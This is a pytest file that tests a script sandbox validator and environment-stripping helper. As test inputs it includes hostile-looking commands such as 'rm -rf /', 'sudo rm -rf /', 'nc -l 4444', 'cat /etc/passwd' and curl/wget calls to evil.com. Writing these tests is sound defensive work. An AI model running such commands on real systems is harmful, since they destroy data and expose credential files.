"""
Tests for script sandbox validation in tools_scripting.py.

Verifies that the AST validator blocks dangerous Python imports/builtins,
bash validator blocks dangerous commands, and the environment is properly stripped.
"""

import os
import sys

import pytest

# Add backend to path so we can import tools_scripting
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from tools_scripting import (
    ScriptValidationError,
    validate_script,
    _validate_python_ast,
    _validate_bash_script,
    _make_clean_env,
    create_and_run_script,
)


# ── Python AST Validation ──

class TestPythonASTValidation:
    """Test that dangerous Python constructs are blocked."""

    def test_blocks_os_import(self):
        with pytest.raises(ScriptValidationError, match="os"):
            _validate_python_ast("import os")

    def test_blocks_subprocess_import(self):
        with pytest.raises(ScriptValidationError, match="subprocess"):
            _validate_python_ast("import subprocess")

    def test_blocks_socket_import(self):
        with pytest.raises(ScriptValidationError, match="socket"):
            _validate_python_ast("import socket")

    def test_blocks_from_os_import(self):
        with pytest.raises(ScriptValidationError, match="os"):
            _validate_python_ast("from os import path")

    def test_blocks_from_os_path_import(self):
        with pytest.raises(ScriptValidationError, match="os"):
            _validate_python_ast("from os.path import join")

    def test_blocks_shutil_import(self):
        with pytest.raises(ScriptValidationError, match="shutil"):
            _validate_python_ast("import shutil")

    def test_blocks_ctypes_import(self):
        with pytest.raises(ScriptValidationError, match="ctypes"):
            _validate_python_ast("import ctypes")

    def test_blocks_exec_builtin(self):
        with pytest.raises(ScriptValidationError, match="exec"):
            _validate_python_ast("exec('print(1)')")

    def test_blocks_eval_builtin(self):
        with pytest.raises(ScriptValidationError, match="eval"):
            _validate_python_ast("x = eval('1+1')")

    def test_blocks_dunder_import(self):
        with pytest.raises(ScriptValidationError, match="__import__"):
            _validate_python_ast("__import__('os')")

    def test_blocks_open_builtin(self):
        with pytest.raises(ScriptValidationError, match="open"):
            _validate_python_ast("f = open('/etc/passwd')")

    def test_blocks_compile_builtin(self):
        with pytest.raises(ScriptValidationError, match="compile"):
            _validate_python_ast("compile('print(1)', '<string>', 'exec')")

    def test_blocks_dunder_attribute(self):
        with pytest.raises(ScriptValidationError, match="dunder access"):
            _validate_python_ast("x.__class__.__subclasses__()")

    def test_blocks_dunder_subclasses(self):
        with pytest.raises(ScriptValidationError, match="__subclasses__"):
            _validate_python_ast("''.__class__.__subclasses__()")

    def test_allows_safe_imports(self):
        # These should not raise
        _validate_python_ast("import math")
        _validate_python_ast("import json")
        _validate_python_ast("import re")
        _validate_python_ast("from datetime import datetime")
        _validate_python_ast("from collections import defaultdict")
        _validate_python_ast("import pathlib")

    def test_allows_safe_code(self):
        script = """
import math
import json

data = {"pi": math.pi, "e": math.e}
result = json.dumps(data)
print(result)
"""
        _validate_python_ast(script)  # Should not raise

    def test_syntax_error(self):
        with pytest.raises(ScriptValidationError, match="syntax"):
            _validate_python_ast("def foo(")

    def test_blocks_http_import(self):
        with pytest.raises(ScriptValidationError, match="http"):
            _validate_python_ast("from http.server import HTTPServer")

    def test_blocks_requests_import(self):
        with pytest.raises(ScriptValidationError, match="requests"):
            _validate_python_ast("import requests")


# ── Bash Validation ──

class TestBashValidation:
    """Test that dangerous bash commands/patterns are blocked."""

    def test_blocks_curl(self):
        with pytest.raises(ScriptValidationError, match="curl"):
            _validate_bash_script("curl http://evil.com")

    def test_blocks_wget(self):
        with pytest.raises(ScriptValidationError, match="wget"):
            _validate_bash_script("wget http://evil.com")

    def test_blocks_rm(self):
        with pytest.raises(ScriptValidationError, match="rm"):
            _validate_bash_script("rm -rf /")

    def test_blocks_rm_rf(self):
        with pytest.raises(ScriptValidationError):
            _validate_bash_script("rm -rf /tmp/stuff")

    def test_blocks_python(self):
        with pytest.raises(ScriptValidationError, match="python"):
            _validate_bash_script("python3 -c 'import os; os.system(\"rm -rf /\")'")

    def test_blocks_sudo(self):
        with pytest.raises(ScriptValidationError, match="sudo"):
            _validate_bash_script("sudo rm -rf /")

    def test_blocks_nc(self):
        with pytest.raises(ScriptValidationError, match="nc"):
            _validate_bash_script("nc -l 4444")

    def test_blocks_pipe_to_bash(self):
        with pytest.raises(ScriptValidationError, match="bash"):
            _validate_bash_script("cat script.sh | bash")

    def test_blocks_command_substitution(self):
        with pytest.raises(ScriptValidationError, match="\\$\\("):
            _validate_bash_script("echo $(whoami)")

    def test_blocks_eval(self):
        with pytest.raises(ScriptValidationError, match="eval"):
            _validate_bash_script("eval 'rm -rf /'")

    def test_blocks_ssh(self):
        with pytest.raises(ScriptValidationError, match="ssh"):
            _validate_bash_script("ssh user@host")

    def test_allows_safe_commands(self):
        # These should not raise
        _validate_bash_script("echo 'hello world'")
        _validate_bash_script("ls -la")
        _validate_bash_script("cat file.txt")
        _validate_bash_script("# comment\necho done")

    def test_allows_safe_multiline(self):
        script = """#!/bin/bash
# Safe script
echo "Starting"
ls -la
cat output.txt
echo "Done"
"""
        _validate_bash_script(script)  # Should not raise

    def test_blocks_passwd_access(self):
        with pytest.raises(ScriptValidationError, match="passwd"):
            _validate_bash_script("cat /etc/passwd")


# ── Interpreter Validation ──

class TestInterpreterValidation:
    """Test that only allowed interpreters are accepted."""

    def test_blocks_unknown_interpreter(self):
        with pytest.raises(ScriptValidationError, match="not allowed"):
            validate_script("perl", "print 'hello'")

    def test_blocks_node(self):
        with pytest.raises(ScriptValidationError, match="not allowed"):
            validate_script("node", "console.log('hi')")

    def test_allows_python3(self):
        validate_script("python3", "print('hello')")

    def test_allows_bash(self):
        validate_script("bash", "echo hello")

    def test_allows_osascript(self):
        validate_script("osascript", 'tell application "Finder" to activate')

    def test_blocks_empty_script(self):
        with pytest.raises(ScriptValidationError, match="empty"):
            validate_script("python3", "")

    def test_blocks_large_script(self):
        with pytest.raises(ScriptValidationError, match="too large"):
            validate_script("python3", "x = 1\n" * 100_000)


# ── Environment Stripping ──

class TestEnvironmentStripping:
    """Test that secrets are removed from the script execution environment."""

    def test_strips_gps_api_key(self):
        os.environ["GPS_API_KEY_TEST"] = "secret123"
        try:
            env = _make_clean_env()
            assert "GPS_API_KEY_TEST" not in env
        finally:
            del os.environ["GPS_API_KEY_TEST"]

    def test_strips_smtp_password(self):
        os.environ["GPS_SMTP_PASSWORD"] = "secret"
        try:
            env = _make_clean_env()
            assert "GPS_SMTP_PASSWORD" not in env
        finally:
            del os.environ["GPS_SMTP_PASSWORD"]

    def test_strips_generic_secret(self):
        os.environ["MY_SECRET_VALUE"] = "hidden"
        try:
            env = _make_clean_env()
            assert "MY_SECRET_VALUE" not in env
        finally:
            del os.environ["MY_SECRET_VALUE"]

    def test_strips_token(self):
        os.environ["GPS_TELEGRAM_TOKEN"] = "tok"
        try:
            env = _make_clean_env()
            assert "GPS_TELEGRAM_TOKEN" not in env
        finally:
            del os.environ["GPS_TELEGRAM_TOKEN"]

    def test_preserves_safe_vars(self):
        env = _make_clean_env()
        # PATH and HOME should survive
        assert "PATH" in env or "HOME" in env


# ── Integration: create_and_run_script ──

class TestCreateAndRunScript:
    """Integration tests for the full create_and_run_script tool."""

    def test_validation_error_returned(self):
        result = create_and_run_script("python3", "import os")
        assert "VALIDATION_ERROR" in result

    def test_invalid_interpreter(self):
        result = create_and_run_script("perl", "print 'hi'")
        assert "VALIDATION_ERROR" in result

    def test_python_hello_world(self):
        result = create_and_run_script("python3", "print('hello sandbox')")
        assert "hello sandbox" in result
        assert "EXIT_CODE: 0" in result

    def test_python_error_returns_stderr(self):
        result = create_and_run_script("python3", "raise ValueError('test error')")
        assert "test error" in result
        assert "EXIT_CODE: 1" in result

    def test_bash_hello_world(self):
        result = create_and_run_script("bash", "echo 'hello bash'")
        assert "hello bash" in result
        assert "EXIT_CODE: 0" in result

    def test_timeout_enforcement(self):
        # 1-second timeout, script sleeps for 5
        result = create_and_run_script(
            "python3",
            "import time; time.sleep(5); print('done')",
            timeout=1,
        )
        assert "TIMEOUT" in result

    def test_empty_script_rejected(self):
        result = create_and_run_script("python3", "   ")
        assert "VALIDATION_ERROR" in result
